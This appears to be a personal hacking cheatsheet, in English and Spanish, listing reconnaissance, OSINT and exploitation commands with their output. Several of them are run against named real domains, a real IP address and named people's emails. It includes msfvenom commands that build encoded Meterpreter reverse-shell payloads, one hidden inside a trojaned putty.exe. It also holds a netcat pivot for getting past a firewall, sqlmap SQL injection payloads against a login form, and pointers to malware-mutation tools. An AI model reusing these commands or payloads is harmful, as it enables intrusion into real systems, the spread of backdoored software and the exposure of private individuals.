Ideally you would run these commands behind a vpn and have proxychains configured to work through Tor.
For simplicity, I only run the core commands.

# Hacking Cheatsheet
    List of commands and techniques to while conducting any kind of hacking :)

    # "The quieter you become, The more you’re able to hear"

<img src="https://cdn.pixabay.com/photo/2013/07/13/11/43/tux-158547_960_720.png"/>

# How to find phising websites using censys.io. In this case, i am searching about websites related with Santander bank, phising websites.

    (santarder*) AND parsed.issuer.organization.raw:"Let's Encrypt"
    
    https://search.censys.io/certificates?q=%28santarder%2A%29+AND+parsed.issuer.organization.raw%3A%22Let%27s+Encrypt%22
    
    
# Post exploitation techniques
# Netcat pivot relay

    # La idea es que estas redirigiendo tráfico desde un puerto no controlado por el firewall (40) a uno que si está controlado por el firewall (23), 
    # es decir, quieres enviar algo al puerto cerrado por el firewall. Para ello, una vez que tienes acceso a la máquina destino, vas a levantar 
    # un servicio netcat escuchando por el 23 
     
    > nc -lvp 23
    listening on [any] 23 ...
    connect to [127.0.0.1] from localhost [127.0.0.1] 42662
    hola
    redirigiendo tráfico desde el puerto 40 que esstara fuera del control del firewall al puerto 23 que si estará controlado por el firewall

    # Luego, en otra máquina o en la misma máquina vulnerable, vas a crear un nodo de caracteres especiales (pivot) que sirva de pila donde enviar el       # exploit
    # man mknod
    # NAME
    #   mknod - make block or character special files
    ...
    
    > mknod pivot  p
    # Creo el puente entre el puerto 40 no filtrado hacia el puerto 23 filtrado por el fw, usando la pila. 
    # Cuando escribo al puerto 40, leo desde la pila, cuando leo desde el 23, escribo a la pila.
        
    > nc -lvp 40 0<pivot | nc 127.0.0.1 23 > pivot
    listening on [any] 40 ...
    connect to [127.0.0.1] from localhost [127.0.0.1] 44386

    # Finalmente creo la conexion al puerto vulnerable. Lo que escriba aquí, finalmente se escribe al puerto supuestamente filtrado por el firewall.
    > nc 127.0.0.1 40
    hola
    redirigiendo tráfico desde el puerto 40 que estara fuera del control del firewall al puerto 23 que si estará controlado por el firewall

# Wifi wardriving

    I modified a bit s4vitar`s version. I have an alfa awu0360h
    
    https://gist.github.com/alonsoir/ebb659ceb939700f577caf33b512d23b
    
    https://gist.github.com/
    
    sudo ./s4viPwnWifi.sh -a  PKMID -n wlan0
    
    airgeddon
    
    https://github.com/v1s1t0r1sh3r3/airgeddon
    
# Commands to hack some web vulnerability

    https://gist.github.com/alonsoir/dff9e961ed090464808e9018080ea6fe   
    
    https://www.youtube.com/watch?v=ggkUREL6djQ&t=4321s
    
# OSINT

# Recon web sites, semippassives

# subwalker, searching subdomains

    https://github.com/m8sec/SubWalker
    
    > ./subwalker.sh northernrich.com
    [*] Executing SubWalker against: northernrich.com
    [*] Launching SubScraper
    [*] Launching Sublist3r
    [*] Launching assetfinder
    [*] Waiting until all scripts complete...
    cat: subscraper.txt: No such file or directory
    cat: sublist3r.txt: No such file or directory
    rm: cannot remove 'subscraper.txt': No such file or directory
    rm: cannot remove 'sublist3r.txt': No such file or directory

    [+] SubWalker complete with 4 results
    [+] Output saved to: /home/kali/git/subwalker/subwalker.txt
    > cat subwalker.txt
    mail.northernrich.com
    northernrich.com
    ns.northernrich.com
    www.northernrich.com
    
# Subscraper, searching subdomains

    https://github.com/m8sec/subscraper

    > subscraper --all --censys-id someId --censys-secret blablebliblobluxD northernrich.com

         ___      _    ___                                                                                                                                                                                    
        / __|_  _| |__/ __| __ _ _ __ _ _ __  ___ _ _                                                                                                                                                         
        \__ \ || | '_ \__ \/ _| '_/ _` | '_ \/ -_) '_|                                                                                                                                                        
        |___/\_,_|_.__/___/\__|_| \__,_| .__/\___|_| v3.0.2                                                                                                                                                   
                                       |_|           @m8r0wn 

                                       / 4 Subdomains Found.
    [*] Identified 4 subdomain(s) in 0:00:36.093118.
    [*] Subdomains written to ./subscraper_report.txt.
    > cat ./subscraper_report.txt
    www.northernrich.com
    mail.northernrich.com
    ns.northernrich.com
    ftp.northernrich.com
    
# Subfinder,  searching subdomains
    
    https://www.kali.org/tools/subfinder/

    > proxychains subfinder -d as.com -silent
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16
    ...    
    playertop-meristation.as.com
    singapore.as.com

     ⭐  ~  ok  took 31s  at 12:44:23 >  

# httpx

    https://github.com/projectdiscovery/httpx

# subfinder and httpx anonimizado por Tor usando proxychains. Buscando ficheros mysql.sql en subdominios.
    
    > proxychains subfinder -d as.com -silent | httpx silent -path "/wp-content/mysql.sql" -mC 200 -t 250 -ports 80,443,8080,8443
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16

        __    __  __       _  __
       / /_  / /_/ /_____ | |/ /
      / __ \/ __/ __/ __ \|   /
     / / / / /_/ /_/ /_/ /   |
    /_/ /_/\__/\__/ .___/_/|_|
                 /_/              v1.2.0

                    projectdiscovery.io

    Use with caution. You are responsible for your actions.
    Developers assume no liability and are not responsible for any misuse or damage.
    ...
    http://seguro.meristation.as.com
    http://www.meristation.as.com

     ⭐  ~  ok  took 1m 20s  at 12:35:15 >                                                                                     

# spiderfoot. 

    Next command will run a server in localhost 5001 port. Deep scan. 
    
    python3 ./sf.py -l 127.0.0.1:5001
    
    https://github.com/smicallef/spiderfoot

# s1c0n

    https://github.com/root-x-krypt0n-x/s1c0n
    
    > sudo python3 sicon.py -u as.com 
    
                  ┏━┓╺┓ ┏━╸┏━┓┏┓╻
                  ┗━┓ ┃ ┃  ┃┃┃┃┗┫
                  ┗━┛╺┻╸┗━╸┗━┛╹ ╹
                
                    Simple Recon
                Coded by UnknownSec666
                   Thanks to: Jeager

        [*] Starting recon on as.com:

          [+] WAF: NOT DETECTED

          [+] OPENED PORTS: 2
            -> 80/tcp  open  http
            -> 443/tcp open  https
            
          [+] SUBDOMAINS DETECTED: 194
            -> xn--90as.com | [80, 113, 443, 2000, 5060, 8008]
            -> telegra.ph | [80, 113, 443, 2000, 5060, 8008]
            -> www.mail.megastore.as.com | FAIL MAYBE HOST DIED
            -> my.as.com | [80, 443]
            -> seuglucmachespti.tk | [80, 443, 8080, 8443]
            -> meristation.as.com | [80]
            -> 2fmeristation.as.com | FAIL MAYBE HOST DIED
            -> backend.meristation.as.com | [80]
            -> parrillatv.api.as.com | FAIL MAYBE HOST DIED
            -> www.toogas.com | [80, 443, 8080, 8443]
            -> dy6.jgdy99.com | [80, 113, 443, 2000, 5060, 8008, 8080, 8443]
            -> serielistas.as.com | [80, 443]
            -> entradas.as.com | [80, 443]
            -> as.com | [80, 443]
            -> colombia.as.com | [80, 443]
            -> be.as.com | FAIL MAYBE HOST DIED
            -> *.resultados.as.com | FAIL MAYBE HOST DIED
            -> api.preferences.as.com | [80, 443]
            -> www.ultra--as.com | FAIL MAYBE HOST DIED
            -> sdmedia.as.com | [80, 443]
            -> fan.as.com | [80, 443]
            -> login.meristation.as.com | [80]

# Web scrapper

    https://github.com/m8sec/pymeta
    
    > pymeta -d as.com -s all -f as.com.csv

    [*] Starting PyMeta web scraper
    [*] Extension  |  Number of New Files Found  |  Search URL
    [!] Captcha'ed by google: Skipping this source...
    [*] pdf :  0 http://www.bing.com/search?q=site:as.com%20filetype:pdf&first=0
    [*] xls :  0 http://www.bing.com/search?q=site:as.com%20filetype:xls&first=0
    [*] xlsx:  0 http://www.bing.com/search?q=site:as.com%20filetype:xlsx&first=0
    [*] csv :  0 http://www.bing.com/search?q=site:as.com%20filetype:csv&first=0
    [*] doc :  2 http://www.bing.com/search?q=site:as.com%20filetype:doc&first=0
    [*] doc :  0 http://www.bing.com/search?q=site:as.com%20filetype:doc&first=34
    [*] docx:  0 http://www.bing.com/search?q=site:as.com%20filetype:docx&first=0
    [*] ppt :  0 http://www.bing.com/search?q=site:as.com%20filetype:ppt&first=0
    [*] pptx:  0 http://www.bing.com/search?q=site:as.com%20filetype:pptx&first=0
    [*] Downloading 2 files to: ./as.c_meta2/
    [*] Extracting Metadata...
    [*] Adding source URL's to the report
    [+] Report complete: as.com.csv


    # Set of osint websites
    
    https://osint.hopain.cyou/Domain.html
    
    # Searching in Linkedin...
    
    https://github.com/m8sec/CrossLinked
    
    > python3 crosslinked.py -f '{first}.{last}@sopra.com' "sopra steria"

         _____                    _             _            _                                                                                                                                                
        /  __ \                  | |   (x)     | |          | |                                                                                                                                               
        | /  \/_ __ ___  ___ ___ | |    _ _ __ | | _____  __| |                                                                                                                                               
        | |   | '__/ _ \/ __/ __|| |   | | '_ \| |/ / _ \/ _` |                                                                                                                                               
        | \__/\ | | (_) \__ \__ \| |___| | | | |   <  __/ (_| |                                                                                                                                               
         \____/_|  \___/|___/___/\_____/_|_| |_|_|\_\___|\__,_| v0.1.0                                                                                                                                        

        @m8r0wn                                                                                                                                                                                               

    [*] Searching google for valid employee names at "sopra steria"
    [!] No results found
    [*] Searching bing for valid employee names at "sopra steria"
    [...
    [+] 90 unique names added to names.txt!
    > cat names.txt
    ...
    
    # PyWhat. Identify what something is, online. Use it with pcap files, btc adresses,...
    
    https://reconshell.com/pywhat-identify-anything/
    
    https://github.com/bee-san/pyWhat
    
    # Basilisk. It uses shodan api to find vulnerable camaras.
    
    https://github.com/spicesouls/basilisk
    
    https://epieos.com provide an email to get data.
    
    https://github.com/lulz3xploit/LittleBrother todo!
    
    https://github.com/tgscan/tgscan-data

    # Iky -> pretty amazing. Provide an email and get data!
    
    https://kennbroorg.gitlab.io/ikyweb/
    
    Run redis-server first
    
    go to folder backend and run the script with sudo
    
    sudo python app.py -e prod
    
    https://gitlab.com/kennbroorg/iKy/blob/iKy/README.md
    
    http://127.0.0.1:4200/pages/apikeys
    
    # OSRF framework, set of tools
    
    https://github.com/i3visio/osrframework
    
    # Phone numbers search, phoneinfoga
    
    https://github.com/sundowndev/phoneinfoga
    
    just type in terminal phoneinfoga serve
    
    a gui will be open in localhost:5000
    
    # Osintgram (Instagram)
    
    https://github.com/Datalux/Osintgram
    
    clone the project, run the next commands to create the docker container:
    
    docker build -t osintgram .
    
    make setup -> put your credentials
    
    make run -> execute
    
    It has some workarounds the moment i tried, but it looks interesting
    
    # xeuledoc
    
    Fetch information about any public Google document.
    
    https://github.com/Malfrats/xeuledoc
    
    > xeuledoc  https://docs.google.com/document/d/1if1Fq_pcHAP0RYla-lsuAI-7BwWL7yCR9nWp8yU1k6M/edit
    Twitter : @MalfratsInd
    Github : https://github.com/Malfrats/xeuledoc

    Document ID : 1if1Fq_pcHAP0RYla-lsuAI-7BwWL7yCR9nWp8yU1k6M

    [+] Creation date : 2020/10/27 21:51:56 (UTC)
    [+] Last edit date : 2020/11/17 10:15:03 (UTC)

    Public permissions :
    - reader
    [+] You have special permissions :
    - reader
    - commenter

    [+] Owner found !

    Name : Samantha Menot
    Email : samantha.menot@databricks.com
    Google ID : 15790401968530511716
    
    # Dante's Gate -> set of tools. It has a lot of errors, probably it is a non maintained version...
    
    https://github.com/Quantika14/osint-suite-tools
    
    > pwd
    /home/kali/git/osint-suite-tools
    > ls
    bots               BuscadorNick.py            BuscadorPersonas.py   data     modules      README.md         search_engines
    BuscadorEmails.py  BuscadorNoticiasFalsas.py  BuscadorTelefonos.py  LICENSE  __pycache__  requiriments.txt  targets.txt
    > sudo python3 -m BuscadorPersonas
    [sudo] password for kali: 


            T U T I O W Y M V R M D Y I H C H A S E Q G P L 3 W 5 K G X 9 B 0
            R X D A N T E ' S   G A T E S   M I N I M A L   V E R S I O N K 2
            5 3 J I T 7 Q Y Q L D M S K Y H L N A W C O M H B C O 9 I N A K G

            Jorge Coronado (aka @JorgeWebsec)
            01.06.02


          ____________________________________________________________________________________________________

          Discleimer: This application allows you to create intelligence through open sources. 
          You do not access information that is not public. The author is not responsible for its use.
          ____________________________________________________________________________________________________

          Description: Dante's Gates Minimal Version is an open application with a GNU license for OSINT with
          Spanish and international sources. Currently it is maintained by Jorge Coronado and there are other
          versions such as mobile and APIs for your applications.
          ----
          Important: the author of this software is not responsible for it's use. The App aims to help
          researchers in OSINT, not to do evil. For more information contact the author.


    None
    __________________________________________________
    | 1. Name, surnames  and DNI                     |
    | 2. Search names and surnames in list           |
    |________________________________________________|

    Select 1/2/3: 

    # more tools, creators of Dante's Gate 
    
    https://github.com/Quantika14 
    
    # Gephi (installed in osx...) TODO
    
    https://gephi.org/users/download/
    
    # Blockchain explorer
    
    https://www.blockchain.com/explorer
    
    # Spiderfoot -> TODO
    
    https://github.com/smicallef/spiderfoot?ref=d
    
    set api keys -> todo
    
    https://sf-e3814fe.hx.spiderfoot.net/optsapi
    
    # TrueCaller -> spam teléfonico
    
    https://www.truecaller.com
    
# Passive collection of information:

    1) google dorks! -> 
    
        https://github.com/m3n0sd0n4ld/GooFuzz -> TODO
    
        https://www.hackingloops.com/google-dorks/ 

        https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/

        Understanding Google Dorks Operators:

        intitle – This allows a hacker to search for pages with specific text in their HTML title. 
        So intitle: “login page” will help a hacker scour the web for login pages.

        allintitle – Similar to the previous operator, but only returns results for pages that meet all of the keyword criteria.

        inurl – Allows a hacker to search for pages based on the text contained in the URL (i.e., “login.php”).

        allinurl – Similar to the previous operator, but only returns matches for URLs that meet all the matching criteria.

        filetype – Helps a hacker narrow down search results to specific files such as PHP, PDF, or TXT file types.

        ext – Very similar to filetype, but this looks for files based on their file extension.

        intext – This operator searches the entire content of a given page for keywords supplied by the hacker.

        allintext – Similar to the previous operator but requires a page to match all of the given keywords.

        site – Limits the scope of a query to a single website.

    2) Shodan.io

    3) Censys.io

    4) theHarvester-> kali version is broken! muy limitado, no me gusta. Muy agresivo, google te bloquea enseguida. 
    Habría que jugar con las opciones para ver si es menos agresivo.
    
    https://github.com/laramies/theHarvester
    
    python3 theHarvester.py -d https://www.northernrich.com/en -g -s -v -n -b all

    5) Maltego -> powerfull, but interesting stuff is not free

    6) recon-ng
    
    https://www.nosolohacking.info/recon-ng-instalacion/
    
    7) archive.org
    
    8) Sherlock
    
    > sherlock --print-all --browse andrewmakokha575@gmail.com
    [*] Checking username andrewmakokha575@gmail.com on:
    ...
    [+] Coil: https://coil.com/u/andrewmakokha575@gmail.com
    [-] ColourLovers: Not Found!
    ...

    9) > maigret XYZ@gmail.com
    [-] Starting a search on top 500 sites from the Maigret database...
    [!] You can run search by full list of sites with flag `-a`

    maigret works with python3.8, so probably you have to activate the environment:
    
    conda create -m mypython3.8 ipykernel=3.8
    conda activate mypython3.8
    pip3 install maigret
    ...
    
    after the work, deactivate it
    
    conda deactivate
    
    10) https://whatsmyname.app/
    
# Semi-passive pickup:

    1) Foca. Only windows. Metadata gathering recovery tool. 

    2) dnsdumpster -> https://dnsdumpster.com/

    3) centralOps -> https://centralops.net/co/

    4) whireshark -> packet sniffer

    5) tcpdump -> packet sniffer

# Active collection:

    1) dnsRecon
    
    dnsrecon -s -a  -f -b -y -k -w  -z  -v -t brt --db /home/kali/Desktop/work/dns-recon-sql-northernrich.file -d https://www.northernrich.com/admin -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --xml /home/kali/Desktop/work/dnsrecon1-northernrich.xml
    
    > dnsrecon -s -a  -f -b -y -k -w  -z  -v -t std --db /home/kali/Desktop/work/dns-recon-sql-northernrich.file -d https://www.northernrich.com/admin  --xml /home/kali/Desktop/work/dnsrecon1-northernrich.xml
    zsh: correct '/home/kali/Desktop/work/dnsrecon1-northernrich.xml' to '/home/kali/Desktop/work/dnsrecon-northernrich.xml' [nyae]? n
    [*] std: Performing General Enumeration against: https://www.northernrich.com/admin...
    [*] Checking for Zone Transfer for https://www.northernrich.com/admin name servers
    [*] Resolving SOA Record
    [*] Resolving NS Records
    [*] NS Servers found:
    [*] Removing any duplicate NS server IP Addresses...
    [*] Checking for Zone Transfer for https://www.northernrich.com/admin name servers
    [*] Resolving SOA Record
    [*] Resolving NS Records
    [*] NS Servers found:
    [*] Removing any duplicate NS server IP Addresses...
    [*] Saving records to XML file: /home/kali/Desktop/work/dnsrecon1-northernrich.xml
    [*] Saving records to SQLite3 file: /home/kali/Desktop/work/dns-recon-sql-northernrich.file
    
    > dnsrecon -d www.northernrich.com -D /usr/share/wordlists/dnsmap.txt -t std --xml /home/kali/Desktop/work/dnsrecon-northernrich.xml
    [*] std: Performing General Enumeration against: www.northernrich.com...
    [-] DNSSEC is not configured for www.northernrich.com
    [*]      SOA ns.northernrich.com 150.107.31.61
    [*]      NS ns.northernrich.com 150.107.31.61
    [*]      MX mail.northernrich.com 150.107.31.61
    [*]      CNAME www.northernrich.com northernrich.com
    [*]      A northernrich.com 150.107.31.61
    [*]      TXT www.northernrich.com v=spf1 a mx ip4:150.107.31.61 ~all
    [*] Enumerating SRV Records
    [+] 0 Records Found
    [*] Saving records to XML file: /home/kali/Desktop/work/dnsrecon-northernrich.xml


    2) nmap

    3) amap
    ...    
    amap v5.4 (www.thc.org/thc-amap) started at 2022-07-01 11:21:02 - APPLICATION MAPPING mode

    Total amount of tasks to perform in plain connect mode: 23
    DEBUG: probing now trigger http (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ssl (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-remote-desktop-protocol (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger netbios-session (3) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger netbios-session (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-ds (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger smtp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ftp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger rpc (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger dns (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ldap (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger oracle-tns-listener (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger x-windows (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger sap-r3 (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-sql (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger jrmi (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger nessus (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger webmin (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger db2 (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger jinilookupservice (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger slp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger tivoli_tsm-server (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger norman-njeeves (1) on 150.107.31.61:443/tcp
    Waiting for timeout on 23 connections ...
    Protocol on 150.107.31.61:443/tcp (by trigger http) matches http
    Protocol on 150.107.31.61:443/tcp (by trigger http) matches http-apache-2
    Protocol on 150.107.31.61:443/tcp (by trigger ssl) matches ssl


    4) masscan -> scan the internet! Literally, you can scan the whole internet if you have time...
    
    root@kali:~# masscan -p22,80,445 192.168.1.0/24

    Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2014-05-13 21:35:12 GMT
     -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
    Initiating SYN Stealth Scan
    Scanning 256 hosts [3 ports/host]
    Discovered open port 22/tcp on 192.168.1.217
    Discovered open port 445/tcp on 192.168.1.220
    Discovered open port 80/tcp on 192.168.1.230
    
# Vulnerability scan:

    1) CVE,CPE,CVSS -> https://cve.mitre.org/

    2) nmap 

    3) nessus
    
    sudo systemctl start nessusd && systemctl --no-pager status nessusd
    
    > sudo systemctl status nessusd

    ● nessusd.service - The Nessus Vulnerability Scanner
         Loaded: loaded (/lib/systemd/system/nessusd.service; disabled; vendor preset: disabled)
         Active: active (running) since Fri 2022-07-01 12:41:42 CEST; 3min 20s ago
       Main PID: 27467 (nessus-service)
          Tasks: 15 (limit: 4589)
         Memory: 1.0G
            CPU: 20.892s
         CGroup: /system.slice/nessusd.service
                 ├─27467 /opt/nessus/sbin/nessus-service -q
                 └─27469 nessusd -q

    Jul 01 12:41:42 kali systemd[1]: Started The Nessus Vulnerability Scanner.
    Jul 01 12:41:55 kali nessus-service[27469]: Cached 240 plugin libs in 67msec
    Jul 01 12:41:55 kali nessus-service[27469]: Cached 240 plugin libs in 45msec

    Then, you can go the app using this url, in my machine. Maybe you have to change that url for https://localhost:8834/#/
    
    https://kali:8834/#/scans/folders/my-scans
    
    Dont you remember user and password?
    
    https://docs.tenable.com/nessus/commandlinereference/Content/ChangeAUsersPassword.htm
    
    sudo systemctl stop nessusd

# Exploitation and hacking of hosts

    1) metasploit -> THE framework to hack and exploit.
    
    I did a scanning session, but it is too long, so i created a gist.
    
    https://gist.github.com/alonsoir/65a703f44ccbbfa7f1ef57c49e86b8de
    
    https://www.kali.org/tools/metasploit-framework/
    
    https://www.offensive-security.com/metasploit-unleashed/
    
    2) msfvenom -> Payload Generator and Encoder
    
    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f vbs > example.vbs
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of vbs file: 7414 bytes
    > ls example.vbs
    example.vbs
    
    # Basically this commands creates a reverse_tcp windows exe app with your ip and port...
    
    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f exe > example.exe
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of exe file: 73802 bytes
    > ls example.exe
    example.exe
    
    # run this command to see output formats... 
    > msfvenom --list formats

    # I can create a custom version of whatever exe file, in this case, putty.exe 
    
    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f exe -x /home/kali/Downloads/putty.exe -o putty-fake.exe
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of exe file: 1449256 bytes
    Saved as: putty-fake.exe
    > ls -tatlh putty-fake.exe
    -rw-r--r-- 1 kali kali 1.4M Jul  1 13:37 putty-fake.exe

    3) pesidious -> weird, now i cannot run it...  https://github.com/CyberForce/Pesidious/issues/8

    https://kalilinuxtutorials.com/pesidious/
    
    quick install commands.
    
    > conda create -n py36 python=3.6 ipykernel
    > conda activate py36
    > python --version
    Python 3.6.13 :: Anaconda, Inc.
    > pip install pip==8.1.1
    > pip install -r pip_requirements/requirements.txt
    python classifier.py -d /path/to/directory/with/malware/files
    python mutate.py -d /path/to/directory/with/malware/files

    4) armitage
    
    Web interface for metasploit
    
    quick commands:
    
        msfdb init
        armitage

    https://localhost:5443/api/v1/auth/account
    
    https://www.dragonjar.org/manual-de-armitage-en-espanol.xhtml
    
    https://www.kali.org/tools/armitage/

# Exploitation and hacking of websites -> You have to see this again.

    1) Burp Suite -> 

    2) SQLInjection

    3) inyeccion de código

    4) sqlMap
    
    Use Burp Suite to generate a txt file with POST request, then run this command:
    
    sqlmap -r post-petition.txt -p username -p password

    https://hackertarget.com/sqlmap-post-request-injection/
    
    https://hackertarget.com/sqlmap-tutorial/
    
    After some minutes, you have this:
    
    ...
    POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
    sqlmap identified the following injection point(s) with a total of 504 HTTP(s) requests:
    ---
    Parameter: password (POST)
        Type: boolean-based blind
        Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' OR NOT 4956=4956#

        Type: error-based
        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' AND GTID_SUBSET(CONCAT(0x71706a7871,(SELECT (ELT(1193=1193,1))),0x7178707871),1193)-- pBsa

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' AND (SELECT 7242 FROM (SELECT(SLEEP(5)))dLML)-- bxut
    ---
    [17:33:50] [INFO] the back-end DBMS is MySQL
    [17:33:51] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
    web server operating system: Linux Debian
    web application technology: Apache 2.4.51, PHP 5.6.40
    back-end DBMS: MySQL >= 5.6
    [17:33:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/www.northernrich.com'


    5) path Traversal

    6) webshells

    7) file upload

    8) html injection y XSS

    9) CSRF

    10) XSstrike

    11) Cookie tampering, command injection

# Exploitation and hacking of network vulnerabilities

    1) MITM

    2) Bettercap

    3) ARP Spoofing

    4) DNS Spoofing

    5) Social engineering toolkit

    6) Polymorph. Manipulation of network traffic in real time and programmable. Black magic!

# Post-exploitation techniques

    1) meterpreter en metasploit

    2) Mimicatz

    3) UAC bypass

    4) procdump y lsass.exe

    5) backdoors en binarios con msfvenom

    6) Password cracking in hashed form with John the ripper and hashcat

    7) session migration using the backdoor.

# Machine learning applied to cybersecurity

    1) Batting, reconnaissance of hosts based on their impact

    2) pesidous, mutating backdoors using the one created by msfVenom.

    3) Deep fakes.

# Mitre&Attck

# Decompiling techniques (black magic)

    GHidra -> in Kali 
    IDA -> /opt/idafree-7.7 ./ida64

# Apply the best nmap scanning strategy for all size networks

# Host discovery, generate a list of surviving hosts

    cd /home/kali/Desktop/work
    sudo nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24
    grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt
    
    #http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf

    sudo nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
